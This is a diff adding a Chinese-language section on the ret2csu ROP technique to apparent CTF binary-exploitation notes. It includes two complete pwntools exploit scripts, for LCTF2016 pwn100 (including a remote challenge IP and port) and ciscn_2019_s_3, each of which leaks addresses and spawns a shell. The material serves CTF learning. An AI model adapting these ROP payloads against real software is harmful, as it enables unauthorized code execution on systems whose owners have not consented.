@@ -2562,6 +2562,160 @@ if __name__ == "__main__":
     main()
 ```
 
+## Ret2csu
+
+个人理解就是大号的 ROP 链。
+
+在很多没有 puts 或者 printf，只有 read 和 write 可以利用的程序中，我们必须控制 rdi，rsi，rdx（或 ebx，ecx，edx）三个寄存器，往往 `pop rdi;ret` 和 `pop rsi,r15;ret` 是平凡的，但是 `pop rdx;ret` 未必会有。
+
+Ret2csu 通常用来解决这个问题。
+
+### 实现原理
+
+在大多数动态链接的程序中，往往存在一个名为 `__libc_csu_init` 的片段，形似：
+
+<img width="1214" height="424" alt="image" src="https://github.com/user-attachments/assets/03d52d23-7f30-456c-84fb-d9d7d5e999f4" />
+
+其在 IDA 中也不一定就在 Function name 栏里，我们可以通过 ROPgadget 搜索 `pop r15,ret` 来寻找它。
+
+为了方便这里称上面的片段叫 csu_mov，下面的叫 csu_pop。
+
+通过跳转到 csu_pop 我们可以控制大量的寄存器，然后 ret 跳转到 csu_mov，按照一一对应的可以控制：
+
+* `r13 ← rdx`
+* `rsi ← r14`
+* `edi ← r15d`
+* `call ← r12+rbx*8` **（执行 r12+rbx*8 地址指向的地址，如 `r12 = write_got,rbx = 0` 会执行 write，但是写 write 的真实地址就不执行）**
+
+因为 `add rbx,1`，我们为了方便初始使 `rbx = 0,rbp = 1`，那么这里 rbx = rbp，`cmp     rbx, rbp` 使 ZF = 1，jnz 不跳转。
+
+然后顺序执行第二次 csu_pop，这里随便垫掉 pop，触发 ret。
+
+#### 例题 1：[LCTF2016]pwn100
+
+[攻防世界 题目链接](https://adworld.xctf.org.cn/challenges/list)
+
+自己搜一下 pwn-100.
+
+其实这个题本身是非常平凡的 ret2libc，因为它同时有 `pop rdi;ret` 和 `puts`。
+
+但是我被 gemini 骗了。它说这道题是 ret2csu 的经典题目。
+
+总之来都来了。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "61.147.171.105"
+port = 60199
+io = remote(host,port)
+# io = process("./pwn100")
+elf = ELF("./pwn100")
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+read_got = elf.got['read']
+main_addr = 0x4006B8
+csu_pop = 0x40075A
+csu_mov = 0x400740
+pop_rdi_ret = 0x400763
+
+def main():
+    # payload_1 = b'A'*0x48 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+    payload_1 = b'A'*0x48 + p64(csu_pop)
+    payload_1 += p64(0)   # rbx
+    payload_1 += p64(1)   # rbp
+    payload_1 += p64(puts_got)    # r12+rbx*8 → call
+    payload_1 += p64(0)           # r13 → rdx
+    payload_1 += p64(0)           # r14 → rsi
+    payload_1 += p64(puts_got)    # r15 → edi
+    payload_1 += p64(csu_mov)
+    payload_1 += b'B'*0x38 + p64(main_addr)
+    payload_1 = payload_1.ljust(200,b'\x00')
+    io.send(payload_1)
+    io.recvline()
+    leak_data = io.recvline().strip(b'\n').ljust(8,b'\x00')
+    # print("\n[*] DEBUG : Leak data = ",leak_data)
+    puts_addr = u64(leak_data)
+    print("\n[+] Leak puts address :",hex(puts_addr))
+    libc_base = puts_addr - 0x06f690
+    print("\n[+] Leak libc base address :",hex(libc_base))
+    system = libc_base + 0x045390
+    print("\n[+] Leak system address :",hex(system))
+    binsh = libc_base + 0x18cd57
+    print("\n[+] Leak /bin/sh address :",hex(binsh))
+    payload_2 = b'A'*0x48 + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(0)
+    payload_2 = payload_2.ljust(200,b'\x00')
+    io.send(payload_2)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+#### 例题 2：ciscn_2019_s_3
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_s_3)
+
+这道题本身是我们 SROP 的练手题，但是也是可以练 ret2csu 的。
+
+因为 execve("/bin/sh",0,0) 要控制 rdi = binsh，rsi = 0，rdx = 0，后面两个寄存器可以用 ret2csu 控制。
+
+因为输出长度是 0x30，可以泄露栈地址，那么我们就可以算出自己填的 binsh 地址。
+
+<img width="1509" height="401" alt="image" src="https://github.com/user-attachments/assets/3e87a064-a248-45b4-b221-b84287f8b837" />
+
+泄露栈到 rbp 是 0x9d8 - 0x8a0 = 0x138，加上 0x10 的 padding 就是 0x148。
+
+那么 ret2csu 控制各个寄存器即可。
+
+注意 ret2csu 的 call 是不能留空的，这里最好的方案是把 `mov rax 15;ret` 填到栈上，然后 call 它在栈上的地址。
+
+```
+# written by Sonnety
+from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+io = process("./ciscn_s_3")
+elf = ELF("./ciscn_s_3")
+csu_pop = 0x40059A
+csu_mov = 0x400580
+main_addr = elf.sym['main']
+pop_rdi_ret = 0x4005a3
+mov_rax_execve_ret = 0x4004E2
+syscall = 0x400501
+
+def main():
+    payload_1 = b'A'*0x18 + p64(main_addr)
+    # gdb.attach(io,"b 0x400519\nc")
+    # pause()
+    io.send(payload_1)
+    io.recvn(0x20)
+    leak_data = io.recvn(8)
+    leak_stack = u64(leak_data)
+    print("\n [+] Leak stack address :",hex(leak_stack))
+    binsh = leak_stack - 0x148
+    print("\n [+] Leak /bin/sh address :",hex(binsh))
+    payload_2 = b"/bin/sh\x00" + b'B'*0x10 + p64(csu_pop)
+    payload_2 += p64(0)       # rbx
+    payload_2 += p64(1)       # rbp
+    payload_2 += p64(binsh + 0x58)       # r12 → call
+    payload_2 += p64(0)       # r13 → rdx
+    payload_2 += p64(0)       # r14 → rsi
+    payload_2 += p64(0)       # r15 → edi
+    payload_2 += p64(csu_mov)
+    payload_2 += p64(mov_rax_execve_ret)
+    payload_2 += b'C'*0x38 + p64(pop_rdi_ret) + p64(binsh) + p64(syscall)
+    io.send(payload_2)
+    io.interactive()
+    
+
+if __name__ == "__main__":
+    main()
+```
+
 ## 栈迁移
 
 在常规的栈溢出攻击中，通常会在覆盖了 ret 之后，继续写入长长的一串 ROP 链（比如用来泄露 libc 然后拿 shell）。
@@ -2880,4 +3034,3 @@ if __name__ == "__main__":
     main()
 
 ```
-
